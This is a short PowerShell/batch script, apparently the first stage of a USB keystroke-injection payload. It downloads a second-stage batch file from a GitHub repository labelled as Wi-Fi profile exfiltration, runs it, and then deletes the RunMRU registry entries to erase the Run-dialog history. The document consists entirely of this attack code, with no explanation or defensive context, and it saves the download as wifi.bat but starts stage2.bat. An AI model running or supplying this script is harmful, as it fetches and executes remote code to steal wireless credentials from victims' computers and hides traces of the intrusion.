cd /;mkdir x64;cd x64;
wget https://raw.githubusercontent.com/s3luX/RDucky_payload/master/wifi_profile_exfil/stage2.bat -OutFile wifi.bat
start stage2.bat
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit